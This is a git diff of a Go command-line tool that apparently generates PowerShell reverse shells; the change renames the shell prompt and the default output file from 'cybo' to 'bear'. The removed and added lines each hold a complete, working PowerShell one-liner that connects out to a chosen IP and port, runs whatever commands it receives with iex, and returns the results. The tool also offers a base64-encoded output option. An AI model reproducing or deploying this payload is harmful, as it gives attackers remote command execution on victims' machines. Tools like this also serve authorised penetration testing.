@@ -22,7 +22,7 @@ var psCmd = &cobra.Command{
 		// Validate Ip address and ports
 		validateIpAndPorts(cmd, args)
 
-		strDataB := `$client = New-Object System.Net.Sockets.TCPClient('` + ipAddressLocal + `', ` + portLocal + `);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'Cybo-PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
+		strDataB := `$client = New-Object System.Net.Sockets.TCPClient('` + ipAddressLocal + `', ` + portLocal + `);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'Bear-PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
 
 		if !generateEncodeOutput {
 
@@ -50,7 +50,7 @@ var psCmd = &cobra.Command{
 func init() {
 	rootCmd.AddCommand(psCmd)
 	psCmd.PersistentFlags().BoolVarP(&generateEncodeOutput, "encoded", "e", false, "Generate Base64 Encoded Powershell output")
-	psCmd.PersistentFlags().StringVarP(&outputFile, "outFile", "o", "cyboShell.ps1", "Generate output file")
+	psCmd.PersistentFlags().StringVarP(&outputFile, "outFile", "o", "bearShell.ps1", "Generate output file")
 
 }
 
